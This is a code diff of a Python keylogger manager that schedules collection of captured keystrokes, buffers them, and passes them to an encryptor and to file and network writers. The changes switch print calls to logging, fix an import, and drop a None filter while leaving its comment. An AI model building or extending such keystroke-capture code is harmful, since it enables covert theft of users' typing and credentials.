@@ -1,11 +1,13 @@
 import threading
+import logging
 from typing import List, Optional
 from datetime import datetime
-from interfaces.IkeyLogger import Ikeylogger
+from interfaces.ikeyLogger import Ikeylogger
 from interfaces.iwriter import IWriter
 from encryption.encryptor import Encryptor
 from config import Config
 
+logging.basicConfig(level=logging.INFO)
 
 class KeyloggerManager:
     def __init__(self, keylogger_service: Ikeylogger, encryptor: Encryptor, file_writer: IWriter = None, network_writer: IWriter=None):
@@ -24,24 +26,24 @@ class KeyloggerManager:
 # פונקציה שמאתחלת את התוכנית 
     def start(self) -> None:
         if self.is_running_flag:
-            print("KeyLoggerManager is already running")
+            logging.warning("KeyLoggerManager is already running")
             return
         self.is_running_flag = True
         self.keylogger_service.start_logging()
         self._schedule_collection()
-        print(f"KeyLoggerManager started with interval {self.update_interval}s")
+        logging.info(f"KeyLoggerManager started with interval {self.update_interval}s")
 
 # פונקציה שמפסיקה את התוכנית
     def stop(self) -> None:
         if not self.is_running_flag:
-            print("KeyLoggerManager is not running")
+            logging.warning("KeyLoggerManager is not running")
             return
         self.is_running_flag = False
         if self.timer:
             self.timer.cancel()
         self.keylogger_service.stop_logging()
         self._collect_and_process()
-        print("KeyLoggerManager stopped")
+        logging.info("KeyLoggerManager stopped")
 
 # בודקת את הזמן
     def _schedule_collection(self) -> None:
@@ -55,12 +57,13 @@ class KeyloggerManager:
             keys = self.keylogger_service.get_logged_keys()
             if keys:
                 # סנן None values
-                filtered_keys = [key for key in keys if key is not None]
                 with self.buffer_lock:
-                    self.buffer.extend(filtered_keys)
+                    self.buffer.extend(keys)
                 self._process_buffer()
+            else:
+                logging.debug("No new keys, skipping write")
         except Exception as e:
-            print(f"Error during collection: {e}")
+            logging.error(f"Error during collection: {e}")
         finally:
             if self.is_running_flag:
                 self._schedule_collection()
